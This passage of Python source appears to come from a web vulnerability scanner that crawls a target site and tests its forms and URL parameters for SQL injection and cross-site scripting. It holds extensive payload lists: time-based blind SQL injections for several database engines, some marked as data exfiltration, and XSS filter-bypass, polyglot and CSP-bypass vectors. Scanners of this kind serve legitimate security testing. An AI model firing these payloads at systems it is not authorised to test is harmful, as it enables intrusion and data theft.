            r"Unexpected end of SQL command",
            r"Data type mismatch in criteria expression",
            r"has occurred in the vicinity of:",
            r"A syntax error has occurred",
            r"ADODB\.Field",
            r"ASP\.NET_SqlClient",
            r"XPathException",
            r"Warning.*safe_mysql",
            r"Syntax error or access violation",
            r"Procedure or function .* expects parameter"
        ]
        
        # Compile regex patterns
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.sql_error_patterns]
    
    def _extract_forms(self, url):
        """
        Extract all forms from a URL.
        
        Args:
            url (str): The URL to extract forms from
            
        Returns:
            list: List of dictionaries containing form details
        """
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            if response.status_code != 200:
                return []
                
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {}
                action = form.get('action', '')
                form_details['action'] = urljoin(url, action) if action else url
                form_details['method'] = form.get('method', 'get').lower()
                form_details['inputs'] = []
                
                for input_tag in form.find_all(['input', 'textarea']):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    input_value = input_tag.get('value', '')
                    
                    if input_name:  # Only include inputs with names
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                
                forms.append(form_details)
            
            return forms
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error extracting forms from {url}: {str(e)}")
            return []
    
    def _extract_parameters(self, url):
        """
        Extract GET parameters from a URL.
        
        Args:
            url (str): The URL to extract parameters from
            
        Returns:
            dict: Dictionary of parameters and values
        """
        parsed_url = urlparse(url)
        return parse_qs(parsed_url.query)
    
    def _scan_get_parameters(self, url):
        """
        Test URL GET parameters for SQL injection vulnerabilities.
        Uses aggressive error-based and time-based detection techniques.
        
        Args:
            url (str): The URL to test
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        parameters = self._extract_parameters(url)
        if not parameters:
            return vulnerabilities
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing GET parameters in URL: {url}")
        
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # First check: standard error-based detection
        for param_name, param_values in parameters.items():
            for payload in self.payloads:
                test_url = f"{base_url}?{param_name}={payload}"
                
                # Add other parameters back
                for p_name, p_values in parameters.items():
                    if p_name != param_name:
                        test_url += f"&{p_name}={p_values[0]}"
                
                try:
                    if self.verbose and self.logger:
                        self.logger.info(f"Testing payload on parameter '{param_name}': {payload}")
                    
                    response = requests.get(
                        test_url, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    # Check for SQL error patterns in response
                    if self._check_sql_errors(response.text):
                        detail = f"Parameter '{param_name}' is vulnerable to SQL injection using payload: {payload}"
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': url,
                            'method': 'GET',
                            'parameter': param_name,
                            'payload': payload,
                            'details': detail,
                            'severity': 'High',
                            'evidence': 'Error-based detection'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"SQL Injection found: {detail}")
                        
                        # No need to test more payloads for this parameter
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing GET parameter '{param_name}': {str(e)}")
        
        # Second check: Enhanced time-based blind detection with our advanced method
        # Only perform if no error-based vulnerabilities found
        if not any(v['parameter'] == param_name for v in vulnerabilities for param_name in parameters.keys()):
            for param_name, param_values in parameters.items():
                if self.verbose and self.logger:
                    self.logger.info(f"Testing parameter '{param_name}' for time-based blind SQL injection")
                
                # Use our advanced time-based detection method
                is_vulnerable, payload, time_diff = self._detect_time_based_sqli(url, param_name=param_name)
                
                if is_vulnerable:
                    detail = f"Parameter '{param_name}' is vulnerable to time-based blind SQL injection using payload: {payload}"
                    vulnerability = {
                        'type': 'SQL Injection',
                        'url': url,
                        'method': 'GET',
                        'parameter': param_name,
                        'payload': payload,
                        'details': detail,
                        'timing': f"Response delayed by {time_diff:.2f} seconds",
                        'severity': 'High',
                        'recommendation': "Parameterize all database queries and implement proper input validation"
                    }
                    vulnerabilities.append(vulnerability)
                    
                    if self.logger:
                        self.logger.warning(f"Time-based SQL injection found: {detail}")
                    
                    # No need to test more parameters once we've found a vulnerability
                    break
                    
        return vulnerabilities

    def _scan_form(self, form_details, url):
        """
        Test a form for SQL injection vulnerabilities.
        Uses aggressive techniques including error-based and time-based detection.
        
        Args:
            form_details (dict): Form details including inputs
            url (str): The URL containing the form
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        action = form_details["action"]
        method = form_details["method"]
        inputs = form_details["inputs"]
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing form on {url} with action {action} using method {method}")
        
        # First check: Test each input field for error-based SQL injection
        for input_field in inputs:
            # Skip non-text inputs like submit buttons, checkboxes, etc.
            if input_field["type"] not in ["text", "search", "email", "url", "password"]:
                continue
                
            input_name = input_field["name"]
            original_value = input_field["value"]
            
            for payload in self.payloads:
                # Clone the inputs dictionary
                data = {}
                for inp in inputs:
                    # Use the original value for all fields except the one being tested
                    if inp["name"] != input_name:
                        data[inp["name"]] = inp["value"]
                    else:
                        data[inp["name"]] = payload
                
                try:
                    if self.verbose and self.logger:
                        self.logger.info(f"Testing form field '{input_name}' with payload: {payload}")
                    
                    if method == "post":
                        response = requests.post(
                            action, 
                            data=data, 
                            headers=self.headers, 
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    else:  # method == "get"
                        response = requests.get(
                            action, 
                            params=data, 
                            headers=self.headers, 
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                    
                    # Check for SQL error patterns in response
                    if self._check_sql_errors(response.text):
                        detail = f"Form field '{input_name}' is vulnerable to SQL injection using payload: {payload}"
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': url,
                            'method': method.upper(),
                            'parameter': input_name,
                            'payload': payload,
                            'details': detail,
                            'severity': 'High',
                            'evidence': 'Error-based detection'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"SQL Injection found: {detail}")
                        
                        # No need to test more payloads for this input
                        break
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error testing form field '{input_name}': {str(e)}")
        
        # Second check: Test each input field for time-based blind SQL injection
        # Only perform if no error-based vulnerabilities found
        if not vulnerabilities:
            for input_field in inputs:
                # Skip non-text inputs
                if input_field["type"] not in ["text", "search", "email", "url", "password"]:
                    continue
                
                input_name = input_field["name"]
                
                if self.verbose and self.logger:
                    self.logger.info(f"Testing form field '{input_name}' for time-based blind SQL injection")
                
                # Use our advanced time-based detection method
                is_vulnerable, payload, time_diff = self._detect_time_based_sqli(
                    url_or_form=action,
                    form_details=form_details,
                    input_field=input_field
                )
                
                if is_vulnerable:
                    detail = f"Form field '{input_name}' is vulnerable to time-based blind SQL injection using payload: {payload}"
                    vulnerability = {
                        'type': 'SQL Injection',
                        'url': url,
                        'method': method.upper(),
                        'parameter': input_name,
                        'payload': payload,
                        'details': detail,
                        'timing': f"Response delayed by {time_diff:.2f} seconds",
                        'severity': 'High',
                        'recommendation': "Parameterize all database queries and implement proper input validation"
                    }
                    vulnerabilities.append(vulnerability)
                    
                    if self.logger:
                        self.logger.warning(f"Time-based SQL injection found: {detail}")
                    
                    # No need to test more inputs once we've found a vulnerability
                    break
        
        return vulnerabilities

    def _detect_time_based_sqli(self, url_or_form, param_name=None, form_details=None, input_field=None):
        """
        Advanced detection for time-based blind SQL injection vulnerabilities.
        This method attempts multiple sophisticated payloads and analyzes response times
        to identify potential blind SQL injection points using real-world exploitation techniques.
        
        Args:
            url_or_form (str): The URL to test or form action URL
            param_name (str, optional): The GET parameter name to test
            form_details (dict, optional): Form details if testing a form
            input_field (dict, optional): Input field details if testing a form field
            
        Returns:
            tuple: (is_vulnerable, payload, time_diff) or (False, None, 0) if not vulnerable
        """
        # Comprehensive database-specific time-based payloads for aggressive real-world detection
        # These payloads are designed to trigger measurable delays in database processing
        # and are specific to different database engines for maximum detection accuracy
        
        # Use shorter delays (2s) to reduce scan time while maintaining detection accuracy
        time_payloads = [
            # MySQL time-based payloads with various contexts and quote escaping
            "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
            "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
            "\" AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
            "') AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
            "1)) AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -",
            "1' AND SLEEP(2)-- -",
            "' AND SLEEP(2)-- -",
            "\" AND SLEEP(2)-- -",
            "1) AND SLEEP(2)-- -",
            ") AND SLEEP(2)-- -",
            "1 AND SLEEP(2)#",
            "AND SLEEP(2)#",
            "1' OR SLEEP(2)-- -",  # OR-based injection that executes in all rows
            "1' AND IF((SELECT user()) LIKE 'root%', SLEEP(2), 0)-- -",  # Conditional with data exfiltration
            "1' AND (SELECT SLEEP(2) FROM DUAL WHERE DATABASE() LIKE 'a%')-- -",  # Conditional on DB name
            "1' AND BENCHMARK(10000000,MD5(NOW()))-- -",  # CPU-intensive alternative to SLEEP
            "' AND BENCHMARK(10000000,MD5(NOW()))-- -",
            "1' UNION SELECT SLEEP(2),NULL,NULL,NULL-- -",  # UNION-based time delay
            
            # PostgreSQL time-based payloads with conditional logic
            "1'; SELECT CASE WHEN (SELECT current_user) LIKE 'pos%' THEN pg_sleep(2) ELSE pg_sleep(0) END-- -",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END-- -",
            "\"; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END-- -",
            "1;SELECT pg_sleep(2)-- -",
            ";SELECT pg_sleep(2)-- -",
            "1'); SELECT pg_sleep(2)-- -",
            "'); SELECT pg_sleep(2)-- -",
            "1)); SELECT pg_sleep(2)-- -",
            "1' OR 1=(SELECT 1 FROM pg_sleep(2))-- -",
            "' UNION SELECT NULL,pg_sleep(2),NULL,NULL-- -",  # UNION with pg_sleep
            
            # SQL Server time-based payloads with database-specific functions
            "1'; WAITFOR DELAY '0:0:2'-- -",
            "'; WAITFOR DELAY '0:0:2'-- -",
            "\"; WAITFOR DELAY '0:0:2'-- -",
            "1); WAITFOR DELAY '0:0:2'-- -",
            "'); WAITFOR DELAY '0:0:2'-- -",
            "); WAITFOR DELAY '0:0:2'-- -",
            ")); WAITFOR DELAY '0:0:2'-- -",
            "1; WAITFOR DELAY '0:0:2'-- -",
            "; WAITFOR DELAY '0:0:2'-- -",
            "' UNION SELECT NULL,NULL,(WAITFOR DELAY '0:0:2'),NULL-- -",  # UNION with WAITFOR
            "1' OR 1=(SELECT 1 FROM sysusers WHERE SUBSTRING(name,1,1)='d' WAITFOR DELAY '0:0:2')-- -",  # Data exfil
            
            # Oracle time-based payloads with heavy queries and built-in functions
            "1' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3)-- -",
            "' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3)-- -",
            "1' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2)-- -",
            "' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2)-- -",
            "1' AND DBMS_PIPE.RECEIVE_MESSAGE(('A'),2) IS NULL-- -",
            "' AND DBMS_PIPE.RECEIVE_MESSAGE(('A'),2) IS NULL-- -",
            "1' AND UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL)) IS NULL-- -",  # DNS-based exfiltration
            "' UNION SELECT NULL,DBMS_PIPE.RECEIVE_MESSAGE(('A'),2),NULL FROM DUAL-- -",  # UNION with delay
            
            # SQLite time-based payloads with resource-intensive operations
            "1' AND 1=like('ABCDEFG',repeat('ABCDEFG',3000000))-- -",
            "' AND 1=like('ABCDEFG',repeat('ABCDEFG',3000000))-- -",
            "1' AND randomblob(100000000) AND '1'='1",
            "' AND randomblob(100000000) AND '1'='1",
            "1' AND LOWER(hex(randomblob(1000000)))-- -",  # CPU-intensive operation
            "' UNION SELECT LOWER(hex(randomblob(1000000)))-- -",  # UNION with CPU-intensive op
            
            # Nested queries with conditional logic (works across multiple DBMS)
            "1' AND (SELECT CASE WHEN (1=1) THEN (SELECT SLEEP(2)) ELSE 1 END)-- -",
            "' AND (SELECT CASE WHEN (1=1) THEN (SELECT SLEEP(2)) ELSE 1 END)-- -",
            "1' AND IF(1=1, SLEEP(2), 0)-- -",
            "' AND IF(1=1, SLEEP(2), 0)-- -",
            "1'; IF(1=1) WAITFOR DELAY '0:0:2'-- -",
            "'; IF(1=1) WAITFOR DELAY '0:0:2'-- -",
            
            # Advanced stacked queries (works if stacked queries are allowed)
            "1'; SELECT SLEEP(2)-- -",
            "'; SELECT SLEEP(2)-- -",
            "1\"; SELECT SLEEP(2)-- -",
            "\"; SELECT SLEEP(2)-- -",
            "1; SELECT pg_sleep(2)-- -",
            
            # Context-specific time-based payloads optimized for different SQL contexts
            "1' OR (SELECT 1 FROM (SELECT SLEEP(2))A)-- -",  # WHERE clauses
            "1 OR (SELECT 1 FROM (SELECT SLEEP(2))A)",       # Numeric contexts
            "' UNION SELECT IF(1=1,SLEEP(2),0)-- -",         # UNION queries
            "1' OR IF(1=1,SLEEP(2),0)-- -",                  # OR conditions
            "1' AND EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE() AND table_name LIKE '%' AND SLEEP(2))-- -"  # EXISTS subquery
        ]
        
        is_form = form_details is not None and input_field is not None
        
        # Control request (non-payload) to establish baseline response time
        try:
            start_time = time.time()
            
            if is_form:
                method = form_details['method']
                action = url_or_form
                
                # Clone the inputs dictionary
                data = {}
                for inp in form_details['inputs']:
                    # Use the original value for all fields
                    data[inp['name']] = inp['value']
                
                if method == 'post':
                    response = requests.post(
                        action, 
                        data=data, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                else:  # method == "get"
                    response = requests.get(
                        action, 
                        params=data, 
                        headers=self.headers, 
                        timeout=self.timeout,
                        allow_redirects=False
                    )
            
            else:  # GET parameter case
                parsed_url = urlparse(url_or_form)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                parameters = self._extract_parameters(url_or_form)
                
                # Create control URL
                control_url = base_url
                if parameters:
                    control_url += '?'
                    for p_name, p_values in parameters.items():
                        control_url += f"{p_name}={p_values[0]}&"
                    control_url = control_url[:-1]  # Remove trailing &
                
                response = requests.get(
                    control_url,
                    headers=self.headers,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            
            end_time = time.time()
            baseline_time = end_time - start_time
            
            # Account for network jitter by adding a buffer to baseline
            # e.g., multiply by 1.5 to set threshold 50% above baseline
            time_threshold = max(baseline_time * 2, 1.5)  # At least 1.5 seconds difference
            
            if self.verbose and self.logger:
                self.logger.info(f"Baseline response time: {baseline_time:.2f}s, Threshold: {time_threshold:.2f}s")
            
            # Test different time-based payloads
            for payload in time_payloads:
                try:
                    if is_form:
                        method = form_details['method']
                        action = url_or_form
                        input_name = input_field['name']
                        
                        # Clone inputs and replace test field with payload
                        data = {}
                        for inp in form_details['inputs']:
                            # Use the original value for all fields except the one being tested
                            if inp['name'] != input_name:
                                data[inp['name']] = inp['value']
                            else:
                                data[inp['name']] = payload
                        
                        start_time = time.time()
                        
                        if method == 'post':
                            response = requests.post(
                                action, 
                                data=data, 
                                headers=self.headers, 
                                timeout=max(self.timeout, 10),  # Ensure timeout is long enough
                                allow_redirects=False
                            )
                        else:  # method == "get"
                            response = requests.get(
                                action, 
                                params=data, 
                                headers=self.headers, 
                                timeout=max(self.timeout, 10),
                                allow_redirects=False
                            )
                    
                    else:  # GET parameter case
                        parsed_url = urlparse(url_or_form)
                        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                        
                        # Create test URL with payload
                        test_url = f"{base_url}?{param_name}={payload}"
                        
                        # Add other parameters back
                        parameters = self._extract_parameters(url_or_form)
                        for p_name, p_values in parameters.items():
                            if p_name != param_name:
                                test_url += f"&{p_name}={p_values[0]}"
                        
                        start_time = time.time()
                        response = requests.get(
                            test_url,
                            headers=self.headers,
                            timeout=max(self.timeout, 10),
                            allow_redirects=False
                        )
                    
                    end_time = time.time()
                    time_diff = end_time - start_time
                    
                    if self.verbose and self.logger:
                        self.logger.info(f"Payload response time: {time_diff:.2f}s, Threshold: {time_threshold:.2f}s")
                    
                    # If the response took significantly longer than baseline (above threshold)
                    if time_diff > time_threshold:
                        # Perform a second control request to confirm it wasn't a network issue
                        start_time = time.time()
                        
                        if is_form:
                            method = form_details['method']
                            action = url_or_form
                            
                            # Clone the inputs dictionary (original values)
                            data = {}
                            for inp in form_details['inputs']:
                                data[inp['name']] = inp['value']
                            
                            if method == 'post':
                                requests.post(
                                    action, 
                                    data=data, 
                                    headers=self.headers, 
                                    timeout=self.timeout,
                                    allow_redirects=False
                                )
                            else:  # method == "get"
                                requests.get(
                                    action, 
                                    params=data, 
                                    headers=self.headers, 
                                    timeout=self.timeout,
                                    allow_redirects=False
                                )
                        
                        else:  # GET parameter case
                            parsed_url = urlparse(url_or_form)
                            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                            parameters = self._extract_parameters(url_or_form)
                            
                            # Create control URL
                            control_url = base_url
                            if parameters:
                                control_url += '?'
                                for p_name, p_values in parameters.items():
                                    control_url += f"{p_name}={p_values[0]}&"
                                control_url = control_url[:-1]  # Remove trailing &
                            
                            requests.get(
                                control_url,
                                headers=self.headers,
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                        
                        end_time = time.time()
                        second_control_time = end_time - start_time
                        
                        # If second control is much faster, it confirms the time-based injection
                        if time_diff > (second_control_time * 1.5) and (time_diff - second_control_time) > 1.0:
                            return True, payload, time_diff
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error during time-based detection: {str(e)}")
                    continue
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during time-based detection setup: {str(e)}")
        
        return False, None, 0

    def _check_sql_errors(self, response_content):
        """
        Check if the response contains SQL error messages.
        Uses aggressive pattern matching to identify even subtle error indications.
        
        Args:
            response_content (str): The response content to check
            
        Returns:
            bool: True if SQL error patterns are found, False otherwise
        """
        # Check response for SQL errors using compiled regex patterns
        for pattern in self.compiled_patterns:
            if pattern.search(response_content):
                return True
        
        return False

    def scan(self):
        """
        Start the SQL injection vulnerability scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting SQL injection scan on {self.target_url}")
        
        try:
            # Scan GET parameters in the base URL
            get_vulnerabilities = self._scan_get_parameters(self.target_url)
            vulnerabilities.extend(get_vulnerabilities)
            
            # Extract and scan forms
            forms = self._extract_forms(self.target_url)
            for form in forms:
                form_vulnerabilities = self._scan_form(form, self.target_url)
                vulnerabilities.extend(form_vulnerabilities)
            
            # Additional crawling for more complex scanning if required by depth
            if self.depth > 1:
                # Extract links from the target page up to the depth level
                try:
                    response = requests.get(self.target_url, headers=self.headers, timeout=self.timeout)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links on the page
                    links = []
                    for a_tag in soup.find_all('a', href=True):
                        link = urljoin(self.target_url, a_tag['href'])
                        # Only include links on the same domain
                        target_domain = urlparse(self.target_url).netloc
                        link_domain = urlparse(link).netloc
                        
                        if link_domain == target_domain and link not in links:
                            links.append(link)
                    
                    # Limit the number of links to scan based on depth
                    max_links = min(len(links), 5 * self.depth)  # e.g., depth 2 = 10 links
                    links = links[:max_links]
                    
                    if self.verbose and self.logger:
                        self.logger.info(f"Found {len(links)} links, scanning {max_links}")
                    
                    # Scan each link
                    for link in links:
                        if self.verbose and self.logger:
                            self.logger.info(f"Scanning link: {link}")
                        
                        # Scan GET parameters
                        get_vulnerabilities = self._scan_get_parameters(link)
                        vulnerabilities.extend(get_vulnerabilities)
                        
                        # Scan forms
                        forms = self._extract_forms(link)
                        for form in forms:
                            form_vulnerabilities = self._scan_form(form, link)
                            vulnerabilities.extend(form_vulnerabilities)
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error during link crawling: {str(e)}")
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during SQL injection scan: {str(e)}")
        
        if self.logger:
            self.logger.info(f"Completed SQL injection scan, found {len(vulnerabilities)} vulnerabilities")
        
        return vulnerabilities

###########################################
# XSS (CROSS-SITE SCRIPTING) SCANNER
###########################################

class XSSScanner:
    """Scanner for detecting Cross-Site Scripting (XSS) vulnerabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the XSS scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # Comprehensive collection of real-world XSS payloads for aggressive detection
        self.payloads = [
            # Basic XSS detection vectors
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Advanced filter bypasses - encodings and obfuscation
            "<img src=x onerror=alert`XSS`>",
            "<body onload=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<svg><script>alert('XSS')</script>",
            "<img src=x onerror=\"\\x61\\x6C\\x65\\x72\\x74('XSS')\">", # Hex encoding
            "<iframe srcdoc=\"<script>alert('XSS');</script>\">",
            "<<script>alert('XSS');//<</script>",
            "<script>a\\u006Cert('XSS')</script>", # Unicode escape
            "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\">" ,
            
            # Polyglot XSS payloads - work in multiple contexts
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";"
            + "alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->"
            + "<script>alert(String.fromCharCode(88,83,83))</script>",
            
            # DOM XSS vectors - protocol handlers and data URIs
            "javascript:alert('XSS')",
            "javascript:alert(1)//",
            "javascript://comment%0Aalert('XSS')",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=", # base64 <script>alert('XSS')</script>
            "data:application/javascript,alert('XSS')",
            
            # Event handlers - comprehensive collection
            "<div onmouseover=\"alert('XSS')\">hover me</div>",
            "<iframe onload=\"alert('XSS')\"></iframe>",
            "<details open ontoggle=\"alert('XSS')\">",
            "<select autofocus onfocus=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<video autoplay onplay=\"alert('XSS')\"><source src=\"x\"></video>",
            "<audio autoplay onplay=\"alert('XSS')\"><source src=\"x\" type=\"audio/mp3\"></audio>",
            "<input autofocus onfocus=\"alert('XSS')\">",
            "<keygen autofocus onfocus=\"alert('XSS')\">",
            
            # Context-specific payloads - attribute and tag context escapes
            "\"></span><script>alert('XSS')</script>",
            "\"onmouseover=\"alert('XSS')\"",
            "\"style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"alert('XSS')\"",
            "\"><script>alert('XSS')</script><\"", # Breaking out of tags
            "'><script>alert('XSS')</script>",
            "';alert('XSS')",
            "\"-alert('XSS')-\"",
            "'-confirm('XSS')-'",
            "</script><script>alert('XSS')</script>", # Closing open script tags
            "</title><script>alert('XSS');</script>", # Escaping title tags
            "></plaintext><script>alert('XSS');</script>", # plaintext context
            "\\x27\\x3balert('XSS')\\x27", # Hex encoded attribute injections
            
            # CSS-based XSS
            "<style>@import 'javascript:alert(\"XSS\")';</style>",
            "<style>body{background-image:url('javascript:alert(\"XSS\")')}</style>",
            "<link rel=stylesheet href='javascript:alert(\"XSS\")'>",
            "<div style=\"background-image: url(javascript:alert('XSS'))\">",
            "<div style=\"behavior: url(javascript:alert('XSS'))\">",
            
            # HTML5 vectors
            "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert('XSS')\">XSS</maction></math>",
            "<form><button formaction=javascript:alert('XSS')>XSS</button>",
            "<isindex type=image src=1 onerror=alert('XSS')>",
            "<object data=\"javascript:alert('XSS')\"></object>",
            "<embed src=\"javascript:alert('XSS')\"></embed>",
            
            # CSP bypass attempts
            "<script src=\"data:;base64,YWxlcnQoJ1hTUycpIj48L3NjcmlwdD4=\"></script>",
            "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
            "<script>setTimeout('alert(\"XSS\")',0)</script>",
            "<script>Function('alert(\"XSS\")')();</script>",
            "<script>new Function('alert(\"XSS\")')();</script>",
            "<script>(()=>{return this})().alert('XSS')</script>", # Global object access
            
            # AngularJS template injection
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            "<div ng-app ng-csp><div ng-click=$event.view.alert('XSS')>click me</div></div>",
            
            # Exotic vectors - using frames, scripts with src 
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<script src=data:text/javascript,alert('XSS')></script>",
            "<input type=\"text\" value=\"\" autofocus onfocus=alert('XSS')>",
            
            # Advanced mutations for filter evasion
            "<sCr\u0130pt>alert('XSS')</scRipt>", # Unicode case manipulation
            "<a href=\"j&#97;v&#97;script&#x3A;alert('XSS')\">Click</a>", # URL encoding with hex
            "<svg><animate xlink:href=#test attributeName=href values=javascript:alert('XSS') /></svg>",
            "<svg><animate attributeName=href values=javascript:alert('XSS') /><a id=test>Click</a>",
            "<svg><set attributeName=href onbegin=alert('XSS')></set>",
        ]
        
        # Reflective XSS detection strings (with unique markers)
        self.reflection_strings = [
            "zxcReflective123XSS456Test890",
            "ReflectiveZXCTestingXSSvbn789",
            "TestNinJAReflectiveXSS456wxk",
        ]
    
    def _extract_forms(self, url):
        """
        Extract all forms from a URL.
        
        Args:
            url (str): The URL to extract forms from
            
        Returns:
            list: List of dictionaries containing form details
        """
        try:
            response = requests.get(url, headers=self.headers, timeout=self.timeout)
            if response.status_code != 200:
                return []
                
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {}
                action = form.get('action', '')
                form_details['action'] = urljoin(url, action) if action else url
                form_details['method'] = form.get('method', 'get').lower()
                form_details['inputs'] = []
                
                for input_tag in form.find_all(['input', 'textarea']):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name')
                    input_value = input_tag.get('value', '')
                    
                    if input_name:  # Only include inputs with names
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                
                forms.append(form_details)
            
            return forms
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error extracting forms from {url}: {str(e)}")
            return []
    
    def _extract_parameters(self, url):
        """
        Extract GET parameters from a URL.
        
        Args:
            url (str): The URL to extract parameters from
            
        Returns:
            dict: Dictionary of parameters and values
        """
        parsed_url = urlparse(url)
        return parse_qs(parsed_url.query)
    
    def _is_xss_successful(self, response_text, payload):
        """
        Check if XSS payload was successfully injected using multiple detection methods.
        Uses aggressive real-world techniques to determine if the payload would execute.
        
        Args:
            response_text (str): The response HTML content
            payload (str): The XSS payload sent
            
        Returns:
            bool: True if XSS is successful, False otherwise
        """
        # Convert response to soup for advanced context analysis
        soup = BeautifulSoup(response_text, 'html.parser')
        
        # Check for exact payload reflection - basic detection
        if payload in response_text:
            # Check if the payload is in a script tag - this is an immediate win for XSS
            for script in soup.find_all('script'):
                if payload in script.text:
                    # Check if the payload is actually part of a string literal
                    # If it's not properly escaped inside JavaScript, it's definitely vulnerable
                    script_content = script.text
                    if '"' + payload + '"' not in script_content and "'" + payload + "'" not in script_content:
                        # The payload is not enclosed in quotes, suggesting it's part of the code
                        return True
                    else:
                        # Even if enclosed in quotes, check if quotes can be escaped
                        if any(x in payload for x in ['"', "'"]) and any(x in script_content for x in [payload.replace('"', '\\"'), payload.replace("'", "\\'")]):
                            return False  # Payload is properly escaped
                        return True  # Potentially exploitable
            
            # Check for HTML tag context - determine if tags remain unfiltered
            if "<script>" in payload:
                return "<script>" in response_text and not payload.replace("<", "&lt;").replace(">", "&gt;") in response_text
            
            # For img/svg tags with event handlers, verify real-world execution potential
            if "<img" in payload and "onerror" in payload:
                # Check if the attribute is properly attached to the tag, not just text
                img_tags = soup.find_all('img')
                for tag in img_tags:
                    if tag.has_attr('onerror') and 'alert' in tag['onerror']:
                        return True
            
            if "<svg" in payload and "onload" in payload:
                svg_tags = soup.find_all('svg')
                for tag in svg_tags:
                    if tag.has_attr('onload') and 'alert' in tag['onload']:
                        return True
            
            # Enhanced detection for event handlers - verify they're in correct context
            event_handlers = ["onmouseover", "onclick", "onload", "onerror", "ontoggle"]
            for handler in event_handlers:
                if handler in payload:
                    # Find all elements with this event handler
                    for tag in soup.find_all(attrs={handler: True}):
                        if 'alert' in tag[handler]:
                            return True
            
            # Check for JavaScript protocol handlers - often bypasses filters
            if "javascript:" in payload:
                for tag in soup.find_all('a'):
                    if tag.has_attr('href') and 'javascript:' in tag['href']:
                        return True
            
            # Data URI scheme - another common bypass technique
            if "data:text/html" in payload:
                for tag in soup.find_all(['a', 'iframe', 'embed', 'object', 'frame']):
                    for attr in ['src', 'href', 'data']:
                        if tag.has_attr(attr) and 'data:text/html' in tag[attr]:
                            return True
        
        # Advanced context analysis - look for DOM XSS potential
